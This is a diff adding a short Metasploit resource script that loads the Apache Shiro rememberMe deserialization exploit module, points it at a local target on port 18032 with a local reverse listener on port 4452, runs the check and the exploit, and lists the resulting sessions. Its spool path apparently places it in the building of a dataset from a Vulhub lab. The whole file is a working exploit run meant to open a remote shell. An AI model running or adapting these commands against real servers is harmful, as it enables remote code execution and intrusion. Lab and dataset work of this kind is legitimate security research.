@@ -1,0 +1,15 @@
+spool /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/shiro_4437/scan3.stdout
+use exploit/multi/http/shiro_rememberme_v124_deserialize
+set RHOSTS 127.0.0.1
+set RPORT 18032
+set LHOST 127.0.0.1
+set LPORT 4452
+set TARGETURI /
+set SSL false
+set VERBOSE true
+check
+run -j
+sleep 20
+sessions
+spool off
+exit
